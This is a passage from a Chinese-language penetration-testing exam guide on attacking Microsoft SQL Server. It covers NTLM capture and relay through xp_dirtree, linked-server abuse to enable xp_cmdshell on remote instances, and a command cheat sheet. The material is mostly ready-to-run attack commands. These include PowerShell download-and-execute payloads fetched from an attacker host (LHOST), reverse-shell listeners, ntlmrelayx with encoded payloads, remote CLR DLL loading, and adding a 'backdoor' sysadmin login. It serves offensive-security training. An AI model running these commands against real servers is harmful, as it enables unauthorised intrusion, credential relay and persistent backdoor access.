- 若只是想要一个稳定的回连，检查 `nc -nvlp LPORT` 收到连接并交互 `whoami`。

**失败分支与备选**：
1. `xp_dirtree` 被拒绝（低权限也报 `EXECUTE permission denied`）→ 逐个试同类扩展存储过程：`EXEC master..xp_subdirs '\\LHOST\x';`、`EXEC master..xp_fileexist '\\LHOST\x';`；仍不行则找数据库内**以 sysadmin 身份定义的存储过程/触发器/作业**或 `EXECUTE AS` 可模拟对象（`Invoke-SQLAuditPrivImpersonateLogin`），在其内部触发 UNC。
2. 目标 SMB 强制签名 → 中继不可行 → 切路线 A（Responder 捕获 + hashcat 破解），或寻找 HTTP/HTTPS/LDAP 型中继目标（`ntlmrelayx -t http://...` / `-t ldap://...`，用于未启用 EPA 的 HTTP 服务，参考 M12 场景 55 的 ESC8 思路）。
3. SQL 主机无法出网到 `LHOST`（回程被防火墙拦）→ 用 Ligolo-ng 在可达主机上开 `listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445`，把触发目标从 `\\LHOST\` 改为 `\\<ligolo监听地址>\`（详见 M08 `Tunneling` 章节）。
4. Responder 与 ntlmrelayx 端口冲突 / 环境里其它主机在抢 445 → 只开一个服务；Responder 换接口或用 `-w`/`-r` 精确控制；确认没有把 Responder 和 relayx 同时挂 445。
5. 中继命令被 AV 拦（payload 落地被杀）→ 换内存加载（`-c "powershell ..."` 直接 IEX 下载字符串）、分阶段或换编码（M05/M07 方法）。

**考试注意 / OPSEC**：
- Responder / ntlmrelayx 监听 445 会短暂影响该网段正常 SMB 流量；在考试网小心别把 DC 的认证也引过来造成"账户锁定"类噪音，建议 `responder -I <iface>` 后立即触发并尽快完成。
- `xp_dirtree` 等触发动作会出现在 SQL Server 的错误日志/Profiler 中；实验环境无妨，正式环境先评估。
- 中继拿到的身份**不是**交互式凭据：用它横向时优先 SMB/服务类（wmiexec、psexec），别浪费时间去试 RDP（除非该账号有 Remote Desktop Users 组）。
- 明确记录目标账号是否属于"敏感账户"（域管/服务账号），中继成功的权限由被中继账号在目标上的本地组成员决定。

---

## 场景 45：Linked Server 能查询，但远程执行失败

**场景回顾**：我们已能访问实例 A，它配置了指向实例 B（甚至 C）的 Linked Server；A 上查询 B 的数据可以成功，但只要涉及**远程执行**（`EXEC ... AT B`、`xp_cmdshell` on B、跨服务器 RPC）就失败。原因通常落在三处：B 端的**映射登录**权限低、A→B 的 **RPC/RPC Out** 未开、以及**两端权限配置不一致**（例如 A 是 sysadmin，映射到 B 却只是 public）。

**前提与假设**：
- 有实例 A 的有效登录（SQL 认证或 Windows 认证），在 A 上至少 `public`，很可能更低权限。
- A 上已能看到名为 `LINKED_B`（本文用 `TARGET2` 表示其 host）的 Linked Server，`SELECT` 能通（否则先解决连通性/凭据问题，不属本场景失败点）。
- 本场景把 A 记为"源实例"，B 为"一跳"，C 为"二跳"（A→B→C）。
- 准备好：`impacket-mssqlclient`（Linux）或 PowerUpSQL/SQLRecon（Windows）、`m11-linked-server-queries.sql`。

**准备（攻击机侧）**：
1. 连接源实例 A：
   ```bash
   impacket-mssqlclient USER:PASS@A_HOST        # SQL 认证
   impacket-mssqlclient DOMAIN/USER:PASS@A_HOST -windows-auth   # Windows 认证
   ```
2. 确认能列出链接服务器（SQL Server 2008+ 用 `sys.servers`）：
   ```sql
   SELECT name, product, provider, data_source, is_linked, is_rpc_out_enabled,
          is_data_access_enabled, is_remote_provider_enabled
   FROM sys.servers;
   ```
   预期至少一行 `is_linked = 1`。
3. 准备"短 payload"思想：通过 Linked Server 执行的长命令极易因引号/长度出错；把长内容做成 **URL 下载**（`http://LHOST/x.ps1`）只让远端执行最短命令，payload 文件放攻击机 HTTP 目录，见脚本模板注释。

**执行步骤**：

1. 确认"能查询但不能执行"的具体边界——逐项测，按顺序排查：
   ```sql
   -- (a) 单跳查询：走得通吗？
   SELECT * FROM OPENQUERY("TARGET2", 'SELECT @@SERVERNAME AS srv, SYSTEM_USER AS u, IS_SRVROLEMEMBER(''sysadmin'') AS is_sa');
   -- (b) EXEC AT 远程执行：走不通时的报错是什么？
   EXEC ('SELECT @@SERVERNAME') AT TARGET2;
   -- (c) 4 部分名查询（需要远端 data access + 元数据；A 默认常不可用）
   SELECT * FROM [TARGET2].[master].[dbo].[syslogins];   -- 若报 OLE DB provider 错误 → 排查 data access
   ```
   常见报错速查：
   - `SQL Server blocked access to ... 'Ad Hoc Distributed Queries'` / `OLE DB provider "SQLNCLI11" ... cannot be used for distributed queries` → `data access`/openquery 配置问题（步骤 4）。
   - `The RPC server is unavailable` / `Server 'TARGET2' is not configured for RPC` → `rpc out` 未开（步骤 3）。
   - `Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'` → **双跳**时中间服务器无法委派（见失败分支 3）。
   - 远程执行成功但 `xp_cmdshell` 报权限 → 远端映射账号非 sysadmin（步骤 5）。

2. 查**远端身份与权限**（看到底是谁在 B 上执行）：
   ```sql
   EXEC ('SELECT SYSTEM_USER AS remote_user, USER_NAME() AS db_user, IS_SRVROLEMEMBER(''sysadmin'') AS is_sa') AT TARGET2;
   -- 若为空/guest 表示走的是映射的 guest 登录 → 权限极低
   ```
   查 B 自己能否看到更深的链接（为多跳铺路）：
   ```sql
   SELECT * FROM OPENQUERY("TARGET2", 'SELECT name, is_rpc_out_enabled, is_linked FROM sys.servers');
   ```

3. **处理 RPC 配置**（RPC Out = 允许通过 `EXEC ... AT` 调用远端）：
   ```sql
   -- 查看 A 上对 B 的 RPC 设置（SQL Server 2008+）
   SELECT name, is_rpc_out_enabled FROM sys.servers WHERE name='TARGET2';
   -- 若为 0 且我们有 sysadmin 权限（或 CONTROL SERVER / ALTER ANY LINKED SERVER），打开：
   EXEC sp_serveroption 'TARGET2', 'rpc out', 'true';
   -- 没有 sysadmin 时这是硬限制：要么找可模拟的 sysadmin（Invoke-SQLAuditPrivImpersonateLogin），要么放弃 EXEC AT，退而用 OPENQUERY 只读查询
   ```
   注意：`sp_serveroption` 属于服务器级配置，低权限通常改不了；这正是本场景典型卡点之一，先尝试 `EXECUTE AS LOGIN='sa'`（若可模拟）：
   ```sql
   EXECUTE AS LOGIN = 'sa';
   EXEC sp_serveroption 'TARGET2', 'rpc out', 'true';
   REVERT;
   ```

4. 需要 `OPENQUERY` 时确认 A 允许对 B 做分布式查询（data access）：
   ```sql
   EXEC sp_serveroption 'TARGET2', 'data access', 'true';   -- 同样需要足够权限
   ```

5. **在 B 上启用 xp_cmdshell 并执行**（前提：映射到 B 的身份是 sysadmin，或 A 上可模拟到 B 的 sysadmin）：
   ```sql
   EXEC ('EXEC sp_configure ''show advanced options'',1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT TARGET2;
   EXEC ('EXEC master..xp_cmdshell ''whoami''') AT TARGET2;
   ```
   远程启用 OLE（备用执行通道）：
   ```sql
   EXEC ('EXEC sp_configure ''Ole Automation Procedures'',1; RECONFIGURE;') AT TARGET2;
   ```

6. **单跳执行命令 / 拿 shell**（把长命令留给下载，远端只跑短命令）：
   ```sql
   -- 方式 1：直接 xp_cmdshell 短命令
   EXEC ('EXEC master..xp_cmdshell ''whoami /all''') AT TARGET2;
   -- 方式 2：让 B 下载并运行（B 需能出网访问 LHOST）
   EXEC ('EXEC master..xp_cmdshell ''powershell -nop -w hidden -c "iex(iwr http://LHOST/run.ps1)"''') AT TARGET2;
   -- 方式 3：整条 base64（引号最少）：
   EXEC ('EXEC master..xp_cmdshell ''powershell -enc <BASE64>''') AT TARGET2;
   ```
   若要回连：攻击机先 `nc -nvlp LPORT`，HTTP 目录放 run.ps1（内容 = 反弹 shell 下载执行）。

7. **多跳（A→B→C）模板**——核心是"在 A 上对 B 发一条 EXEC，让 B 再对 C 发一条 EXEC"：
   ```sql
   -- 枚举 C：通过 B 看 B 的链接
   SELECT * FROM OPENQUERY("TARGET2", 'SELECT name, is_rpc_out_enabled FROM sys.servers');
   -- C 上执行（B→C 的 EXEC AT 整个作为字符串包给 B）
   EXEC ('EXEC (''EXEC master..xp_cmdshell ''''whoami'''''') AT TARGET3') AT TARGET2;
   -- 多跳查询：内层 OPENQUERY 的引号全部翻倍
   SELECT * FROM OPENQUERY("TARGET2", 'SELECT * FROM OPENQUERY("TARGET3", ''SELECT @@SERVERNAME AS srv'')');
   ```
   引号规则（极其容易出错）：
   - 最外层 SQL 里：字符串用单引号；字符串内部再出现单引号 → `''` 翻倍。
   - `OPENQUERY` 的 server 名用双引号，放在外层字符串里时双引号不变，但**外层 PowerShell / 命令行**再包一层时按命令行规则转义。
   - 完整模板见 `m11-linked-server-queries.sql`（含每层引号标注）。

8. 拿到 B 的 sysadmin 会话后的两条常见后续：
   - 在 B 上执行系统命令（上面方式）。
   - 在 B 上加一个新登录并设 sysadmin（若想以后直接连 B，绕开 A 的长链路）：
     ```sql
     EXEC ('EXEC sp_addlogin ''backdoor'', ''P@ssw0rd!''') AT TARGET2;
     EXEC ('EXEC sp_addsrvrolemember ''backdoor'', ''sysadmin''') AT TARGET2;
     -- 然后 impacket-mssqlclient backdoor:P@ssw0rd!@B_HOST 直连
     ```
     考试里"加登录"这类持久化动作按考点决定是否执行，先确认题目目标。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m11-linked-server-queries.sql` | 链接枚举 / 单跳 / 多跳 / `EXEC ... AT` 全套模板（引号标注） | 替换 `TARGET2`/`TARGET3` 等 |
| `m11-powerupsql-templates.ps1` | `Get-SQLServerLinkCrawl`、`Invoke-SQLAudit`、开 xp_cmdshell 的 PS 侧封装 | `-Instance A_HOST` |
| `m11-sqlrecon-templates.ps1` | SQLRecon 的 link 模块对照（links / linkquery / linkcmd） | `/h:A_HOST /m:linkquery` |
| `m11-responder-relay-sql.sh` | 若 B 是"中继目标"时的收尾路线 | `TARGET` |

**验证**：
- `EXEC ('SELECT @@SERVERNAME, SYSTEM_USER') AT TARGET2` 返回 B 的主机名与远端用户 → RPC 通。
- 步骤 5 的 `xp_cmdshell 'whoami'` 返回形如 `nt service\mssql$...` 或 `DOMAIN\svc_sql` → 远端命令执行成功。
- 多跳执行返回 C 的 `whoami` → 链路完整。
- 反向 shell 监听端收到连接。

**失败分支与备选**：
1. `EXEC ... AT` 报"not configured for RPC" → 尝试以可模拟的 sysadmin 身份执行 `sp_serveroption 'TARGET2','rpc out','true'`（`EXECUTE AS LOGIN='sa'`），不可模拟时改用 `OPENQUERY` 只读路线或找新的凭据；没有 RPC Out 时**无法**远程调用存储过程/xp_cmdshell，只能数据查询。
2. 远端能执行但不是 sysadmin（`xp_cmdshell` 拒绝）→ 在 B 端做**登录枚举 + 模拟**：`EXEC ('SELECT name FROM sys.server_principals WHERE type IN (''U'',''S'')') AT TARGET2`；用 PowerUpSQL `Invoke-SQLAuditPrivImpersonateLogin -Exploit` 找到可模拟成 sysadmin 的登录再执行。
3. 多跳时报 `NT AUTHORITY\ANONYMOUS LOGON` / Kerberos 委派错误 → B→C 的链路需要"传递凭据"，双跳 EXEC 在部分版本/配置下被禁止；备选：直接用 4 部分名做**数据**级访问 `SELECT * FROM [TARGET2]...[sysservers]`，或从 B 拉出 C 的连接信息后**直连 C**（若端口可达），或对 B 做完整控制后在其上加凭据直连 C。
4. 命令太长 / 引号太多报语法错误 → 全部改"下载+执行"短命令：只让远端跑 `powershell -enc <短BASE64>` 或 `curl http://LHOST/x`；BASE64 由本地 `iconv -t UTF-16LE | base64 -w 0` 生成（命令本身不包含引号与空格，最稳）。
5. `OPENQUERY` 报 OLE DB / 分布式查询被禁 → 需要 `data access=true`（需 sysadmin）；没有时把 B 的数据用普通 `SELECT` 循环取回 A，不追求远端就地执行。
6. A 本身是低权限且无 sysadmin 可模拟 → 回到场景 44 的"触发对外认证 + 中继"路线，把 A 的 SQL 服务账号引到别的目标上。

**考试注意 / OPSEC**：
- **引号转义是最大丢分点**：写远程字符串时心里过一遍"当前在第几层"，在脚本模板里复制、只改服务器名，别手写嵌套。
- 远程启用 `xp_cmdshell` 会立即被 DBA/EDR 类监控关注（SQL Server 有审计事件）；做完验证动作后若题目不需要可考虑关闭：`EXEC ('EXEC sp_configure ''xp_cmdshell'',0; RECONFIGURE;') AT TARGET2`。
- `sp_addlogin` 加后门登录属持久化动作：考试中只在题目明确要求或常规授权环境使用，记录并事后清理。
- 先确定本场景拿到的到底是"数据访问权"还是"服务器控制权"：很多题目只需要你用 Linked Server 读 B 里某个表（那就别折腾 xp_cmdshell），先按最小权限原则满足题目。

---

## 模块速查表

| 目的 | 命令（示例） |
|---|---|
| 连接 SQL（SQL 认证） | `impacket-mssqlclient USER:PASS@TARGET` |
| 连接 SQL（Windows 认证） | `impacket-mssqlclient DOMAIN/USER:PASS@TARGET -windows-auth` |
| 确认是否 sysadmin | `SELECT IS_SRVROLEMEMBER('sysadmin');` |
| 查 xp_cmdshell 状态 | `SELECT name,value_in_use FROM sys.configurations WHERE name='xp_cmdshell';` |
| 开 xp_cmdshell | `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;` |
| 触发对外认证（捕获/中继） | `EXEC master..xp_dirtree '\\LHOST\share';` |
| Responder 捕获 | `sudo responder -I eth0` |
| hashcat 破 NTLMv2 | `hashcat -m 5600 hash.txt rockyou.txt` |
| 中继到 SMB 目标 | `impacket-ntlmrelayx --no-http-server -smb2support -t smb://TARGET -c "powershell -enc <B64>"` |
| 列 Linked Server | `SELECT name,is_linked,is_rpc_out_enabled FROM sys.servers;` |
| 单跳查询 | `SELECT * FROM OPENQUERY("TARGET2", 'SELECT @@SERVERNAME');` |
| 单跳执行 | `EXEC ('EXEC master..xp_cmdshell ''whoami''') AT TARGET2;` |
| 开远端 RPC Out | `EXEC sp_serveroption 'TARGET2','rpc out','true';` |
| 多跳执行（A→B→C） | `EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT TARGET3') AT TARGET2;` |
| 审计/模拟（PowerUpSQL） | `Invoke-SQLAuditPrivImpersonateLogin -Verbose -Instance TARGET -Exploit` |
| CLR 执行（SQLRecon） | `SQLRecon.exe /a:WinToken /h:TARGET /m:impersonate /i:sa /m:clr /dll:http://LHOST/Warhead.dll /function:Main` |
| 生成短 BASE64（本地） | `echo -en 'IEX (...)' \| iconv -t UTF-16LE \| base64 -w 0` |

## 关联脚本清单

| 文件 | 用途 |
|---|---|
| `m11-linked-server-queries.sql` | Linked Server 枚举 / 单跳 / 多跳 / EXEC AT 模板与引号转义 |
| `m11-powerupsql-templates.ps1` | PowerUpSQL 发现 / 枚举 / 审计 / 模拟 / 执行 / CLR 模板 |
| `m11-sqlrecon-templates.ps1` | SQLRecon 模块对照（info / impersonate / xpcmd / olecmd / clr / links） |
| `m11-responder-relay-sql.sh` | Responder / ntlmrelayx 中继一键流程 + SQL 触发命令打印 |
